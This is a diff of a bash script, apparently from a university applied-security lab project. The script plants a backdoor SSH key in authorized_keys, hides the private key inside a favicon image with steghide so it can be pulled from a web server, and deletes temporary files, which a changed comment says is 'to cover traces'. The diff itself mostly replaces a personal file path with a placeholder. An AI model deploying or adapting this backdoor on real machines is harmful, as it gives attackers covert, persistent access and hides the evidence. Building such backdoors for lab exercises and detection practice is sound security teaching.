@@ -3,9 +3,8 @@
 # https://stackoverflow.com/questions/11287861/how-to-check-if-a-file-contains-a-specific-string-using-bash
 # https://askubuntu.com/questions/419548/how-to-set-up-a-root-cron-job-properly
 
-PATH_TO_FAVICON='/home/brad/Documents/EPFL/SYSCOM/MA04-ETHZ/Applied_security_laboratory/project/runtime_terror/src/webserver_dev_dreyvor_TO_MERGE_LATER/test_script/favicon.jpg'
-USERID='556e567564476c745a56526c636e4a7663673d3d' # hex(base64(RuntimeTerror))
-
+PATH_TO_FAVICON='/path/to/favicon.jpg'
+USERID='556e567564476c745a56526c636e4a7663673d3d' # hex(base64.encode('RuntimeTerror'))
 
 # Make sure that the authorized key is present
 (umask 077 && test -d ~/.ssh || mkdir ~/.ssh)
@@ -25,6 +24,6 @@ if ! grep -q "$USERID" ~/.ssh/authorized_keys; then
 	# Steghide the ssh private key into the favicon
 	steghide embed --coverfile $PATH_TO_FAVICON --embedfile $tmp_file -e none -Z -f -p '' -N > /dev/null 2>&1
 	
-	# delete temporary files
+	# delete temporary files to cover traces
 	rm -f $tmp_file "$tmp_file.pub"
 fi
